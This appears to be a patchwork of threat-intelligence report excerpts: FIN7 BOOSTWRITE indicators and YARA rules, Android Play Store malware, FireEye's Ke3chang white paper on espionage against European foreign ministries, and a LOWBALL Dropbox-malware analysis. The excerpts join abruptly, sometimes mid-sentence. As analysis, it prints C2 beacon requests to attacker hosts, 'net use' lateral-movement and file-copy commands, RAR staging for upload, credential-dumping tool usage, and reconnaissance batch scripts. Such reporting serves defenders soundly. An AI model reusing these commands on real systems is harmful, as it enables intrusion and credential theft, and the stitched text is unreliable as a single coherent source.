bypass particular security controls. Barring any further law enforcement actions, we expect at least a portion of the actors who comprise the FIN7 criminal organization to continue conducting campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in methods employed by the FIN7 actors.\\nSigs Up Dudes! Indicators, Toolmarks, and Detection Opportunities\\nWhile FireEye does not release our production detection logic for the code families, this section does contain some identification and hunting concepts that we adopt in our layered detection strategy. Table 4 contains malware samples referenced in this blog that FireEye is able to share from the larger set recovered during active investigations.\\nType\\nIndicator(s)\\nBOOSTWRITE (signed)\\nMD5: a67d6e87283c34459b4660f19747a306\\nSHA-1: a873f3417d54220e978d0ca9ceb63cf13ec71f84\\nSHA-256: 18cc54e2fbdad5a317b6aeb2e7db3973cc5ffb01bbf810869d79e9cb3bf02bd5\\nC2: 109.230.199.227\\nBOOSTWRITE (unsigned)\\nMD5: af2f4142463f42548b8650a3adf5ceb2\\nSHA1: 09f3c9ae382fbd29fb47ecdfeb3bb149d7e961a1\\nSHA256: 8773aeb53d9034dc8de339651e61d8d6ae0a895c4c89b670d501db8dc60cd2d0\\nC2: 109.230.199.227\\nTable 4: Publicly-shareable BOOSTWRITE samples\\nThe signed BOOSTWRITE sample has a PE Authenticode anomaly that can be detected using yara’s PE signature module.

Of note, this signed BOOSTWRITE sample has no counter signature and, while the unauthenticated attributes timestamp structure is present, it is empty. In preparing this blog, FireEye’s Advanced Practices team identified a possible issue with VirusTotal’s parsing of signed executable timestamps as seen in Figure 4.\\nFigure 4: Inconsistency in VirusTotal file signature timestamps for the signed BOOSTWRITE sample\\nFireEye filed a bug report with Google to address the discrepancy in VirusTotal in order to remove confusion for other users.\\nTo account for the detection weaknesses introduced by techniques like code signing, our Advanced Practices team combines the malicious confidence spectrum that comes from ML detection systems with file oddities and anomalies (weak signals) to surface highly interesting and evasive malware. This technique was recently described in our own Dr. Steven Miller’s Definitive Dossier of Devilish Debug Details. In fact, the exact same program database (PDB) path-based approach from his blog can be applied to the toolmarks seen in this sample for a quick hunting rule. Figure 5 provides the PDB path of the BOOSTWRITE samples from this blog.\\nF:\\\\projects\\\\DWriteImpl\\\\Release\\\\DWriteImpl.pdb\\nFigure 5: BOOSTWRITE PDB path\\nThe Yara rule template can be applied to result in the quick rule in Figure 6.\\nrule ConventionEngine_BOOSTWRITE\\n{\\nmeta:\\nauthor = \"Nick Carr (@itsreallynick)\"\\nreference = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"\\nstrings:\\n$weetPDB = /RSDS\\\\x00-\\\\xFF{20}a-zA-Z?:?\\\\\\\\\\\\\\\\\\\\s|*\\\\s?.{0,250}\\\\\\\\DWriteImpl\\\\\\\\\\\\s|*\\\\s?.{0,250}\\\\.pdb\\\\x00/ nocase\\ncondition:\\n(uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $weetPDB and filesize < 6MB\\n}\\nFigure 6: Applying BOOSTWRITE’s PDB path to a Yara rule\\nWe can apply this same concept across other executable traits, such as BOOSTWRITE’s export DLL name (DWriteImpl.dll), to create quick and easy rules that can aid in quick discovery as seen in Figure 7.\\nrule Exports_BOOSTWRITE\\n{\\nmeta:\\nauthor = \"Steve Miller (@stvemillertime) & Nick Carr (@itsreallynick)\"\\nstrings:\\n$exyPants = \"DWriteImpl.dll\" nocase\\ncondition:\\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $exyPants at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directoriespe.IMAGE_DIRECTORY_ENTRY_EXPORT.virtual_address) + 12)) and filesize < 6MB\\n}\\nFigure 7: Applying BOOSTWRITE’s export DLL names to a Yara rule (Note: this rule was updated following publication.

It seems likely that over 2-3 months, the malware authors used different names, games, and techniques to see what apps they could publish in Play while flying under the radar. Then, just before Christmas, a game called Cake Tower received an update. The update turned on functionality similar to the initial versions of Brain Test and included a new command and control (C2) server, which was the smoking gun we needed to tie together the apps.\\nThe explanation for the apps’ high ratings and hundreds-of-thousands of downloads is the malware itself. First off, some of the apps are fully-functioning games. Some are highly rated because they are fun to play. Mischievously, though, the apps are capable of using compromised devices to download and positively review other malicious apps in the Play store by the same authors. This helps increase the download figures in the Play Store. Specifically, it attempts to detect if a device is rooted, and if so, copies several files to the /system partition in an effort to ensure persistence, even after a complete factory reset.

While it’s definitely true that users are considerably safer when downloading only from a mainstream source like the Google Play Store, we recommend users remain cautious and use additional security software to ensure the safety of their device.\\nAppendix\\nBelow is a list of applications that were removed from the Google Play Store:\\nFigure 3\\nSubsequent Behavior\\nAfter the initial persistence routine completes, several background services continue to check-in with the command-and-control servers.

      "'WHITE PAPEROPERATION ﬁKE3CHANGﬂ:Targeted Attacks Against Ministries of Foreign Affairs Authors: Nart Villeneuve, James T. Bennett, Ned Moran, and Kenneth Geers 2 www.fireeye.com CONTENTS ...............................................................................................................................................................................................................................................................................................................3 .....................................................................................................................................................................................................................................................13 ....................................................................................................................................................................................................................................................................................................... 18Conclusion ................................................................................................................................................................................................................................................................................................................................................19 ................................................................................................................................................................................................................................................................................................................................ 20 3 www.fireeye.com Diplomatic missions, including ministries of foreign affairs (MFA), are high-priority targets for today™s cyber spies. Large-scale cyber espionage campaigns such as ﬁGhostNetﬂ have demonstrat -ed that government agencies around the world, including embassies, are vulnerable to targeted cyber attacks.1As the crisis in Syria escalates, FireEye research -ers have discovered a cyber espionage campaign, which we call ﬁKe3chang,ﬂ that falsely advertises information updates about the ongoing crisis to compromise MFA networks in Europe. We believe that the Ke3chang attackers are operating out of China and have been active since at least 2010. However, we believe specific Syria-themed attacks against MFAs (codenamed by Ke3chang as ﬁmoviestarﬂ) began only in August 2013. The timing of the attacks precedes a G20 meeting held in Russia that focused on the crisis in Syria.2FireEye gained visibility into one of 23 known command-and-control (CnC) servers operated by the Ke3chang actor for about one week. During this time, we discovered 21 compromised machines connecting to the CnC server. These included what appear to be three administrative tests by the attackers and two connections from other malware researchers. Among the targets, we identified nine compromises at government ministries in five different European countries. Eight of these compromises were at MFAs. When FireEye had visibility on the CnC server, we saw the attackers engage in post-compromise information gathering and lateral movement on the target network, where upon FireEye immedi -ately contacted the relevant authorities and began the notification process.The changing face of espionageAlas, poor James Bond. The days are over when spies had to be both a black belt and Prince Charming in the same scene. Today, the vast majority of intelligence collection is conducted through signals intelligence. The ubiquity and vulnerability of the Internet have opened windows into the affairs of Washington, Beijing, and Moscow to a degree that Bond author, Ian Fleming, would never have imagined. The advanced persistent threatThe worldwide deployment of espionage-focused malware has made this generation the Golden Age of espionage. Global reach, stealthy maneu -vers, legal cover, and plausible deniabilityŠwhat more could a spy ask for? That is why FireEye focuses on the vexing problem of the advanced persistent threat (APT).APT activity is best described as a campaign, a series of attacks over time. Each attack compris -es a variety of phases, including reconnaissance, exploitation, command and control, lateral movement, and exfiltration. 3 Intelligence can be extracted during each phase of the attack to build a full understanding of the tools, techniques, and procedures (TTPs) used by a particular APT campaign™s life cycle. However, network defenders may have only partial visibility into any single incident. That makes tracking and correlating activity across multiple related incidents critical.The Ke3chang campaign The Ke3chang attackers have been active since at least 2010. Tracking their activity over time has revealed information on their targeting preferenc -es and the malware tools they use. The attackers have used three types of malware over the years and have traditionally targeted the aerospace, energy, government, high-tech, consulting 1 Information Warfare Monitor. ﬁTracking GhostNet: Investigating a Cyber Espionage Networkﬂ.

However, the number of attacks against entities in these sectors has been small. The scarcity of individual attacks may indicate the attackers are selective about their targets. During August 2013, FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang attackers. In addition to confirming compromised endpoints at several MFAs, FireEye gained unique insight into the attackers™ lateral movement activities. In this report, we present the historical intelligence we have gathered on the Ke3chang campaign, as well as an in-depth assessment of the ongoing Syrian-themed attacks against these MFAs. Our objective is to arm network defenders with information to combat this threat actor. Targeting Traditionally, the Ke3chang attackers have used spear-phishing emails with either a malware attach-ment or a link to a malicious download. They have also leveraged a Java zero-day vulnerability (CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF Reader (CVE-2010-2883). The Ke3chang attackers have also sent Windows screensaver files (.scr) and executable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original filename extension from the targeted user. 4 In addition to the recent Syria-themed campaign, they also used a London Olympics-themed campaign in 2012 and one that involved former model and French first lady Carla Bruni in 2011. Over the years, the Ke3chang attackers have used three types of malware that we call: ﬁBS2005ﬂ, ﬁBMWﬂ, and ﬁMyWebﬂ. We believe these three types of malware are an evolution of a single project from a single developer or small team of developers sharing code. Functionally, it is a typical first stage backdoor commonly found in APT attacks. It has the ability to upload and download files, run shell commands, and sleep for a configurable length of time. All of the CnC commu -nications are performed over the HTTP protocol. Figure 1: Percent of attacks by industry targeted by Ke3chang actor 4 Ke3chang used the Java vulnerability (CVE-2012-4681) before a patch was available. Krebs, B. ﬁ™Right-to-Left Override™ Aids Email Attacksﬂ. September 2011. 5 www.fireeye.com The current Ke3chang campaign leverages the BS2005 malware, while older activity from 2010-2011 leveraged BMW, followed by the MyWeb malware sporadically used in between. Just as the media began to report on possible U.S. military intervention in Syria, the Ke3chang attackers began to use this topic as a lure to trick their targets into running their malware. Although attackers routinely employ breaking news as lures, the targets of this campaign, codenamed by Ke3chang as ﬁmoviestarﬂ, were various ministries of foreign affairs in Europe. The malware used in this most recent campaign is known as ﬁBS2005ﬂ. One sample was located in a ZIP file named ﬁUS_military_options_in_Syria.zipﬂ (6cb633b371700d1bd6fde49ab38ca471) and contained the file ﬁUS_military_options_in_Syria.pdf. exeﬂ (b68a16cef982e6451ddf26568c60833d). This executable is a ﬁloaderﬂ that contains the process debugging (PDB) string:c:\\\\BS2005\\\\BS2005\\\\release\\\\Loader.pdbUpon execution, the loader drops another executable ﬁie.exeﬂ (277487587ae9c11d7f4b -d5336275a906) that contains the following PDB string:c:\\\\BS2005\\\\BS2005\\\\release\\\\IE.pdbThis executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of the backdoor. Upon execution of ﬁie.exeﬂ, it beacons to a CnC host, named cascais.epac.to (IP: 122.10.83.51), with the following HTTP traffic pattern: POST /p3oahin/<filename>.aspx-?r=<Base64 Encoded Data>=&a= HTTP/1.1 Accept: */* Accept-Language: en-us UA-CPU: x86 Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compati-ble; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30) Host: cascais.epac.to Content-Length: 4 Connection: Keep-Alive <Base64 Encoded Data>Although this sample uses the ﬁ/p3oahin/ﬂ path, we have observed earlier samples that used the path ﬁ/ke3chang/ﬂ and ﬁ/shfam9y/.ﬂ The sample we analyzed randomly chooses the <filename> to use in the URL from the following hard-coded list: albumtop.aspx blogvideo.aspx celebrity.aspx modules.aspx newpage.aspx pratty.aspx tieback.aspx ugctag.aspx verycd.aspx worldcat.aspx In addition, each sample contains a mark or campaign tag, embedded in the Base64 callback payload that allows the attackers to keep track of their various campaigns. In this case, the mark in the Syria-themed iteration of this campaign was consistently the ﬁmoviestarﬂ tag. 6 www.fireeye.com Each byte of the CnC data goes through the following transformation: The data has 0x27 plus its positional index number added to it It is then XOR™d with its positional index number This data is then Base64 encoded, with ‚+™ characters being replaced with ‚*™ characters when the data is transmitted as a parameter in the URLThe Base64 data for the ‚r™ parameter decodes and decrypts to the following data format:<Local IP address> <Computer name> <Domain> <Campaign marker> <Date/Time> <Command identifier> <Volume serial number> <yes/no/nn> <empty line> <empty line>In this format, the <yes/no/nn> indicates whether more data is available for command output or file upload. An ﬁnnﬂ refers to NOP/NOOP (ﬁNO OPer -ationﬂŠa beacon signal). Various versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information, such as the following: Installed mail client Internet Explorer version Windows version Whether a proxy server is configured Whether a virtual machine was detected In addition to the Base64 data in the URI of the HTTP POST, the BS2005 malware also includes Base64 data in the body of the HTTP POST. The Base64 data for the POST body decodes and decrypts to one of the following: ﬁno,ﬂ uploaded file content, or the output from the previous command. Once the HTTP POST completes, the response is an HTML page with a hidden form (see Figure 3). A particular string sequence is expected, which Figure 2: BS2005 CnC encryption routine 7 www.fireeye.com contains a command ID and delimited parameters. All three malware families that FireEye analyzed (BS2005, MyWeb, and BMW) follow a similar CnC pattern in their HTTP replies.At least one of the BS2005 samples contained a simple anti-virtual machine heuristic. Specifically, the GetTickCount function is called and a loop is executed 999,999,990 times that simply incre -ments a variable. After this loop completes, GetTick-Count is called again and the values are compared. If they are the same, the process terminates. A trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM interface to perform their CnC communi-cation. This programming interface allows the programmer to reuse code from an existing browser (typically Internet Explorer) to perform Web browsing, simplifying the development process. The network communication is actually performed through the browser process, causing some misdirection when it comes to determining which process is ultimately responsible for generat -ing this network traffic. This technique is nothing new for malware, but FireEye did notice something interesting in BS2005™s behavior. BS2005 attempts to kill any processes named ﬁmaxthon.exeﬂ or ﬁ360se.exe.ﬂ The ﬁ360se.exeﬂ process seems to make sense, because it relates to 360 Chinese anti-virus software. But why the Figure 3: Rendered Web page retrieved by BS2005 as HTTP REPLY to HTTP POST Figure 4: HTML retrieved by BS2005. The highlighted portion contains the post-compromise command data returned back to the malware 8 www.fireeye.com malware would be programmed to terminate Maxthon, a free browser developed by a Chinese company, was initially unclear. Upon further investigation, we found that if a Maxthon browser is open while the BS2005 malware uses this IWebBrowser2 COM interface to navigate to a Web page, the Maxthon browser opens a new tab and visibly navigates to the Web page itself. Instead of using other APIs to make Web requests and read responses, the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser processes running on the target computer. This lack of sophistication is present throughout the code in all three malware families (BS2005, MyWeb, and BMW). BS2005 is actually the most complex of the three, which makes sense given that it is the most recent malware family we have seen. Improvements in the BS2005 version of the malware include a ﬁsleep until date/timeﬂ command and weak encryption for all CnC data; previous iterations (MyWeb and BMW) did not encrypt the host information sent in the beacon. In 2011 a campaign, labeled ﬁsnakeﬂ by the attackers, started using the theme of nude photos of the French prime minister™s wife, Carla Bruni, as a lure. Attackers sent an email to various targets that encouraged recipients to download a password-protected RAR file (see Figure 5).The malware contained within the RAR was named ﬁcarla_bruni_nude_pics_spp.scrﬂ (727ef86947f5e109435298e077296a42 ). When executed, the BS2005 malware connected to a CnC server with the following HTTP traffic pattern: POST /ke3chang/Directx.aspx-?r=<Base64 Encoded Data> HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compati-ble; MSIE 8.0; Windows NT 5.1; Trident/4.0) Accept-Encoding: gzip, deflate Host: g20news.ns01.us Content-Length: 4 Connection: Keep-Alive <Base64 Encoded Data>Figure 5: BS2005 ﬁsnakeﬂ campaign email attack vector 9 www.fireeye.com The CnC server™s hostname in this case contains the string ﬁg20newsﬂ; because of this, FireEye believes that the targets of the ﬁsnakeﬂ campaign may have been related to the G20 finance ministers meeting held in Paris, France on October 15, 2011. In 2012, another series of attacks began that leveraged information about the London Olympics in an attempt to lure targets into clicking on malicious attachments (see Figure 6 and Figure 7). Based on information from the FireEye® Dynamic Threat IntelligenceŽ (DTI) cloud, we observed that this campaign targeted a single firm in the Chemi-cals/Manufacturing/Mining sector. These attacks leveraged older exploits in Adobe PDF Reader (CVE-2010-2883) and Microsoft Word (CVE-2010-3333). These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc and b391d47b37841741a1817221b946854a) connected to the following CnC servers: news.studenttrail.com skyline.ns1.nameThe HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path of ﬁ/ke3chang/ﬂ to ﬁ/shfam9y/ﬂ. POST /shfam9y/Default.aspx-?r=<Base64 Encoded Data>a= HTTP/1.1This could represent an attempt to avoid any network-based signatures that detect based on the specific URL path of earlier samples. Lastly, the addition constant for the CnC encryption routine in these two BS2005 samples is 0x7C.Figure 6: BS2005 ﬁdream/ dolphinﬂ campaign 2012 Olympic- themed decoy contentŠdaily competition schedule www.fireeye.com Three months after the Olympics-themed attacks, FireEye observed a new BS2005 campaign labeled ﬁnewtiger,ﬂ which is possibly a reference to an older 2010 campaign labeled ﬁtiger.ﬂ The decoy content in this case is a threat report from a well-known security vendor (see Figure 8). Using information from the FireEye DTI cloud, FireEye observed that this campaign targeted a single firm in the Services/Consulting sector. The sample used in this attack (50dd-931b85891168244a10073f4a6f79) dropped BS2005 malware that connected to the CnC www.trap.dsmtp.com and used the ﬁ/shfam9y/ﬂ URI path. The Ke3chang attackers used the older ﬁMyWebﬂ malware family from 2010 to 2011. The MyWeb sample that FireEye analyzed has a compile date of 1/20/2011. At least one of the attacks in this campaign leveraged a European security and defense-themed lure, which aligns with the targeting preferences for this group.MyWeb is the second-generation malware used by this threat actor; it was used after BMW but before BS2005. Improvements over BMW include an anti-sandbox detection technique, a configu -rable sleep value for the CnC beacon loop, and a consolidated configuration block that enables the malware author to change the CnC domain without having to recompile the malware. MyWeb™s anti-sandbox detection technique calls GetSystemTime, saving the value, then looping 500,000 times calling GetSystemTime for each loop; finally, the malware compares the millisec -onds value of the last call with the value saved from the first call. If the values are equal, the malware process terminates silently. Figure 7: BS2005 ﬁdream/ dolphinﬂ campaign 2012 Olympic-themed decoy contentŠ early check-in communication www.fireeye.com The MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the portable executable (PE) file. To decode the configuration data, each charac -ter has its positional index number added to it. The CnC domain is stored at offset 0x0. Upon successful connection to the CnC server, the malware sleeps for the amount of time that is stored in seconds at offset 0x20. The sleep value used for CnC connection failures is stored in minutes at offset 0x30.MyWeb only encrypts the command results data sent back to the CnC server using the same weak encryption algorithm as BS2005 (see Figure 2). The addition constant for the encryption routine for the sample we analyzed (be58180f4f7ee-6a643ab1469a40ffbca) is 0x5A. The beacon data is transmitted in URL parameters in plaintext and is self-explanatory: hxxp://ensun.dyndns.org/MYWEB/SearchX.ASpX?id1=<local IP address>&id2=<computer name>&id3=<volume serial num-ber>&id4=<32 random alphabet char-acters>Downloaded and uploaded files are simply Base64 encoded. Command results are encrypted and then Base64 encoded.Figure 8: BS2005 ﬁnewtigerﬂ campaign security- themed decoy contentFigure 9: MyWeb configuration block decode routine www.fireeye.com BMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang attackers in older 2010 attacks. The initial infection vector is unknown; however, BMW was presumed to be delivered via weaponized email attachments/linksŠsimilar to the newer campaigns leveraging MyWeb and BS2005. The samples we analyzed have a compile date of 2010/07/08. This malware is known as BMW, due to the presence of this PDB string:e:\\\\DebugBmw1.0\\\\BMW\\\\release\\\\Large.pdbBMW sample (649691e1d367721f0ff899fd31133915) beacons to CnC mail.yahoo. sendsmtp.com with the following fake HTTP traffic: POST /<filename>.aspx?Random=<16 Random Alphabet Characters> HTTP/1.1 Accept: text/html, appli-cation/xhtml+xml, */* Accept-Language: en-US User-Agent: Mozilla/5.0 (compati-ble; MSIE 9.0; Windows NT 6.1; Trident/5.0) Accept-Encoding: gzip, deflate Host: mail.yahoo.sendsmtp.com Content-Length: 144 Connection: Keep-Alive<Base64 Encoded Data>The <filename> in the URI is randomly chosen from one of the following hard-coded entries within the malware binary: acheb.aspx bajree.aspx cyacrin.aspx dauber.aspx eaves.aspx The Base64 encoded data in the POST body decodes to the following:<Local IP address> <Computer name> <Domain> <Browser version> <Mail client> <Campaign marker> <Date/Time> <ProxyEnable/ProxyDisable> <Y/N> <second parameter of last CnC response> <Last command executed> <X Bytes> <Volume serial number>The <Y/N> data indicates whether the malware is running inside a virtual machine. The <X Bytes> data indicates the number of bytes last downloaded from the download file command.BMW encrypts uploaded and downloaded files and command results before Base64 encoding them, using the same weak encryption algorithm as BS2005 (see Figure 2). The constant used for addition in the sample we analyzed is 0x5A.Figure 10: Decoded MyWeb configuration block www.fireeye.com Malware Family Matrix Table 1 is a complete list of all samples that were analyzed as part of this investigation, along with any known URI variances, campaign markers, and decoy or lure themes used by this threat actor.

Figure 11: Common Ke3chang CnC infrastructure 5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the ﬁEourdeghﬂ variant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a www.fireeye.com Using the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then mapped all the IP addresses that these domains resolved to. We then collected any other domains that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers. Upon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China, and Hong Kong. Figure 12: Expanded Ke3chang CnC infrastructure Figure 13: Geolocation of Ke3chang CnC infrastructure www.fireeye.com Ke3chang CnC control panel Upon accessing one of the Ke3chang CnC servers, we found that the attackers have a Web-based control panel that allows them to interact with compromised computers, as shown in Figure 14.The control panel also contains a link to an ﬁAutoScannerﬂ feature that includes several preconfigured commands to gather informa-tion about a compromised system and perform network reconnaissance on the endpoint (see Figure 15). Once a compromised system connects to the CnC server, the Ke3chang attackers follow a predeter -mined script. They first gather information about the local computer and the network to which it is connected. FireEye found the following tools on the CnC server, which the attackers used to steal logon credentials and move laterally across the network: Figure 14: Ke3chang CnC control panelFigure 15: Ke3chang AutoScanner commands www.fireeye.com a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe gsecdump v0.7 by REDACTED (REDACTED@truesec.se) 291503be3c25e52382f2a54420d03d71 gsl.exe gsecdump v0.6 by REDACTED (REDACTED@truesec.se) 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe NetE v1.0 Questions, comments, bitches and bugs to REDACTED@cultdeadcow.com 8cf6e698ecf3e167321a3ed2b9a9c62f PwDul2.exe 8cf6e698ecf3e-167321a3ed2b9a9c62f PwDump62.l.exe Usage: PwDul2.exe -x-n-h-o output_file-u user-p password-s share ma -chineNameAfter running the standard commands available in the AutoScanner, the attackers often used the ﬁnet groupﬂ command to acquire information about specific network groups revealed in the pre-configured commands. This step was done manually; we found several instances of typing errors, such as the following: net group ﬁREDACTEDﬂ /doamin net group /doaminThe attackers then listed information for specific users, focusing on users and groups suspected of possessing advanced rights such as domain administrators and service accounts that have access to a wide range of systems. Then they used the ﬁnet useﬂ command to map network drives, including some that required a password, as follows: net use \\\\\\\\REDACTED REDACT-ED:J: /user:REDACTED In some cases, they appeared to try and move laterally by copying a file (always initially called ﬁmsn.tmpﬂ) to other machines on the network. They frequently changed the destination directo -ry and filename of the target file, presumably to make finding the malware more difficult for incident responders upon initial discovery. net use \\\\\\\\172.xx.xx.x REDACTED /u:172.xx.xx.x\\\\REDACTED dir \\\\\\\\172.xx.xx.x\\\\c$ dir ﬁ\\\\\\\\172.xx.xx.x\\\\c$\\\\Program Files\\\\Adobeﬂ copy C:\\\\Users\\\\REDACTED\\\\AppDa-ta\\\\Local\\\\Microsoft\\\\Windows\\\\msm.tmp ﬁ\\\\\\\\172.xx.xx.x\\\\c$\\\\Program Files\\\\ Common Files\\\\Adobe\\\\ARM\\\\1.0\\\\AdobeARM.exeﬂ /yThe attackers then deleted the network shares: net use \\\\\\\\REDACTED /del Figure 16: Ke3chang AutoScanner command panel output www.fireeye.com After that, attackers gathered specific data of interest (such as the listings of all files in certain directories), and compressed it all within the RAR archive as follows: %temp%/wmp32.dll a -m5 ŒhpRE-DACTED %temp%/tem.rar %temp%\\\\*dir*.*They then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from the compromised system: dir %temp%/tem.rar del C:\\\\DOCUME~1\\\\REDACTED\\\\REDACTED\\\\Temp\\\\tem.rarDuring our window of visibility, FireEye found evidence that the attackers were able to enumerate the various target networks, move laterally to compromise new systems, and finally to gather information that was compressed and uploaded to the CnC server. However, FireEye lost visibility on this Ke3chang CnC server before the attackers shifted to the major data exfiltration phase. Determining attribution requires more than just malware analysis.6 It requires an understanding of the attackers activities across the attack life cycle (or ﬁkill chainﬂ), along with an assessment of contextual indicators, such as the targeting, timing, and scope of the attacks.7 Unfortunately, this level of visibility is not always available, which often leaves significant gaps in analysis. Therefore, exploring competing hypotheses is important, as is recogniz -ing, and acknowledging areas of uncertainty. 8Moreover, ﬁattributionﬂ can have multiple mean -ings. Some use it to refer to an ultimate beneficiary, such as a nation-state, while others use the term to refer to malware authors or CnC operators. 9During our investigation, FireEye focused on technical clues left by the malware authors and CnC operators. Within the malware binaries themselves, linguistic clues point to the malware authors™ use of the Chinese language, as seen in Figure 17.Figure 17: PE resource containing Chinese text present in BS2005 sample 6 Bejtlich, R. ﬁAttribution Using 20 Characteristics ﬁ.

The subset of CnC servers that were not hosted by dynamic DNS infrastructure was registered using a registrar in China (XIN NET) and the WHOIS records indicate that the registrant is in China. The following email addresses were used to register those non-dy-namic CnC domains: xiaoxiao_222@yahoo.com tk329@yahoo.com zsy@gmail.comDuring our period of visibility into the BS2005 ﬁmoviestarﬂ campaign against various ministries of foreign affairs in Europe, FireEye discovered that the attackers had initially tested the malware in virtual machines, prior to compromising actual targets. We retrieved the output of the commands the attackers had run when testing the malware. The output indicates that the Ke3chang attackers are testing their malware in Windows operating systems, with the default language set to Chinese.Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within China. But their exact identities and motivation remain unknown.Conclusion Ministries of foreign affairs in Europe have been targeted and compromised by a threat actor we call Ke3chang. This attack used the crisis in Syria as a lure to deliver malware to its targets. The timing of the attack precedes the G20 meeting in Russia that focused on the crisis in Syria. Further -more, FireEye has presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and have attacked targets related to G20 meetings in the past.During our investigation, we were able to observe the inner workings of one of the CnC servers used by the attackers. As a result, we were able to identify some of the victims of the attack, as well as gather circumstantial evidence that indicates that the attackers may be operating from China. Figure 18: Test CnC output generated by the Ke3chang actor after infecting their test endpoints with BS2005 malware FireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | During our brief window of visibility into one of the known 22 CnC nodes, FireEye observed the attackers conducting reconnaissance and moving laterally throughout the compromised networks. Relevant authorities were immediately notified upon this discovery, and FireEye began its worldwide target notification process. At that time, FireEye did not observe the attackers exfiltrating sensitive data; however, we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data shortly thereafter. Accordingly, diplomatic missions, including ministries of foreign affairs, continue to be target -ed by malware-based espionage campaigns. This report demonstrates that attackers are able to successfully penetrate government targets using exploits for vulnerabilities that have already been patched and despite the fact that these ministries have defenses in place. This illustrates the limitations of traditional defenses and highlights the need for security strategies that not only leverage advanced technologies designed to defend against targeted threats, but also the incorporation of threat intelligence and an incident response capability.

A China-based cyber threat group, which FireEye tracks as an uncategorized advanced persistent threat (APT) group and other researchers refer to as “email\\xa0protected,” may have conducted the activity.1 The email messages contained malicious documents with a malware payload called LOWBALL. LOWBALL abuses the Dropbox cloud storage service for command and control (CnC). We collaborated with Dropbox to investigate the threat, and our cooperation revealed what may be a second, similar operation. The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.23\\nA Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis\\nThe threat group has previously used newsworthy events as lures to deliver malware.4 They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.5\\nThe group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China. The threat group’s latest activity coincided with the announcement of criminal charges against democracy activists.6 During the past 12 months, Chinese authorities have faced several challenges, including large-scale protests in Hong Kong in late 2014, the precipitous decline in the stock market in mid-2015, and the massive industrial explosion in Tianjin in August 2015. In Hong Kong, the pro-democracy movement persists, and the government recently denied a professor a post because of his links to a pro-democracy leader.7\\nMultiple China-based cyber threat groups have targeted international media organizations in the past. The targeting has often focused on Hong Kong-based media, particularly those that publish pro-democracy material. The media organizations targeted with the threat group’s well-crafted Chinese language lure documents are precisely those whose networks Beijing would seek to monitor. Cyber threat groups’ access to the media organization’s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.8\\nThreat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions\\nIn August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television. The first email references the creation of a Christian civil society organization to coincide with the anniversary of the 2014 protests in Hong Kong known as the Umbrella Movement.

It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files. The communication occurs via HTTPS over port 443.\\nAfter execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:\\nMD5\\nFilename\\nd76261ba3b624933a6ebb5dd73758db4\\nWmiApCom\\n79b68cdd0044edd4fbf8067b22878644\\nWmiApCom.bat\\nThe “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents. However, this is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.\\nThe threat group monitors its Dropbox account for responses from compromised computers. Once the LOWBALL malware calls back to the Dropbox account, the attackers will create a file called “COMPUTER_NAME_upload.bat” which contains commands to be executed on the compromised computer. This batch file is then executed on the target computer, with the results uploaded to the attackers’ Dropbox account in a file named “COMPUTER_NAME_download”.\\nWe observed the threat group issue the following commands:\\n@echo off\\ndir c:\\\\ >> %temp%\\\\download\\nipconfig /all >> %temp%\\\\download\\nnet user >> %temp%\\\\download\\nnet user /domain >> %temp%\\\\download\\nver >> %temp%\\\\download\\ndel %0\\n@echo off\\ndir \"c:\\\\Documents and Settings\" >> %temp%\\\\download\\ndir \"c:\\\\Program Files\\\\\\n\" >> %temp%\\\\download\\nnet start >> %temp%\\\\download\\nnet localgroup administrator >> %temp%\\\\download\\nnetstat -ano >> %temp%\\\\download\\nThese commands allow the threat group to gain information about the compromised computer and the network to which it belongs. Using this information, they can decide to explore further or instruct the compromised 